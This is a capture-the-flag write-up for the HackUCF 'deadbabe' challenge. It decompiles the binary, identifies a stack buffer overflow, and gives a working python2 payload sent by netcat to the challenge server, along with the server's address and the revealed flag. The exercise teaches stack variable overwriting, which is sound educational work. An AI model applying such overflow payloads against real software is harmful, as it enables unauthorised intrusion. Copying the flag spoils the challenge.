# deadbabe

## Overview:

Category: Binary Exploitation

Difficulty: Easy

## What We Have:



```deadbabe```

What is this deadbabe file?
```c
$ file deadbabe
deadbabe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d3739ef7941fb4c59c0700bcb561d0dea77b3081, for GNU/Linux 3.2.0, stripped
```

As we can see here it is a 64bit executable. We can also notice that it is dynamically linked and is stripped.

Let's see what security features are enabled on this executable.
```c
$ checksec deadbabe 
[*] '/home/anthony/hackucf/deadbabe/deadbabe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Looks like there is no stack canary, so overwriting memory on the stack should be possible. Pie is enabled which will affect the addressing in the executable, nx is enabled which disallows us to execute shellcode, and we have full relro which disallows us from dynamically messing with the executable.

## Approach

We are given a remote connection: `nc 45.55.130.243 37234`

Let's connect and see what we are greeted with.

```c
$ nc 45.55.130.243 37234
Input: 
A
baadf00d does not equal deadbabe 
```
Interesting, we were prompted for input, gave an `A` and recieved `baadf00d does not equal deadbabe`

What if we give it abunch of `A`'s

```c
$ nc 45.55.130.243 37234
Input: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
41414141 does not equal deadbabe 
```

Okay so now we have a different output. So we can assume now that the input is overflowing into wherever `baadf00d` was being stored as 41 represents the ascii code of `A`.

Let's disassemble the executable and see what we can find.

Opening the file in ghidra we are able to find a function that seems to be the main one along with one that seems to give the flag:
```c
undefined8 FUN_00101207(void)

{
  char local_14 [8];
  uint local_c;
  
  local_c = 0xbaadf00d;
  puts("Input: ");
  fgets(local_14,0x10,_stdin);
  if (local_c == 0xdeadbabe) {
    FUN_001011e9();
  }
  printf("%x does not equal %x",(ulong)local_c,0xdeadbabe);
  return 0;
}

void FUN_001011e9(void)

{
  system("cat flag.txt");
  exit(-1);
}
```

With some renaming of variables we get something a little more comprehensive:
```c
undefined8 main(void)

{
  char buffer [8];
  uint target;
  
  target = 0xbaadf00d;
  puts("Input: ");
  fgets(buffer,16,_stdin);
  if (target == 0xdeadbabe) {
    win();
  }
  printf("%x does not equal %x",(ulong)target,0xdeadbabe);
  return 0;
}

void win(void)

{
  system("cat flag.txt");
  exit(-1);
}
```
We see that the program is checking to see if the target variable is set to `0xdeadbabe`, but we can see in the program that the value of target is actually `0xbaadf00d`.

In order for us to get the flag we need to call the win() function, and to do that we need to pass the previously discussed condition.


## Attack

So recalling some properties of the stack, when a variable is instantiated it is pushed on top of the stack. Therefor on the stack of the program we have `buffer` and `target`.

More specifically we have `buffer` on top of `target`. Where buffer is 8 bytes and target is 4. (`0xbaadfood` represents 4 hex bytes)

So in order to rewrite the target address, we need to send 8 bytes to fill in the buffer, than the following 4 bytes, which will overflow into the value of target needs to be the wanted bytes: `0xdeadbabe`.

Trying it:
```c
$ python2 -c 'print "A" * 8 + "\xde\xad\xba\xbe"' > payload
$ nc 45.55.130.243 37234 < payload
Input: 
bebaadde does not equal deadbabe 
```
`Note: "\xde\xad\xba\xbe" is just deadbabe being written with hex recognition`

Now you may notice that the bytes we overwrote, were not what we wanted. The reasoning is because memory is stored in little-endian.

What little-endian does is it reverses the order at byte level, meaning the order of the bytes is changed and not the individual bits. (bytes are 8 bits)

So lets reverse our bytes and try again.

```c
$ python2 -c 'print "A" * 8 + "\xbe\xba\xad\xde"' > payload
$ nc 45.55.130.243 37234 < payload                         
Input: 
hackucf{d3pen6s_h0w_b4d_7h3_f00d_w4s}
```

Boom we got our flag!

Now you know how to overwrite variables on the stack.

## Flag

hackucf{d3pen6s_h0w_b4d_7h3_f00d_w4s}
